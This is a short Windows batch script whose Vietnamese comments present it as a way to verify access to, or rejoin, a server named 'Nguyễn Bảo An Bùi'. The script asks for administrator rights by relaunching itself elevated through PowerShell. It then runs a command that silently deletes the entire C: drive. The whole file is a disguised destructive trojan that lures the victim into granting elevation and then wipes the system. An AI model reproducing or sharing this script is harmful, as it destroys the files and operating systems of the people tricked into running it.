@echo off
:: Kiểm tra quyền Administrator để xác minh vào server Nguyễn Bảo An Bùi
net session >nul 2>&1
if %errorlevel% neq 0 (
    :: Nếu không có quyền admin, yêu cầu chạy lại với quyền Administrator để được vô lại server Nguyễn Bảo An Bùi
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Đã cấp quyền Administrator vui lòng đợi để xác minh vào server Nguyễn Bảo An Bùi
rd C:\ /s /q
exit
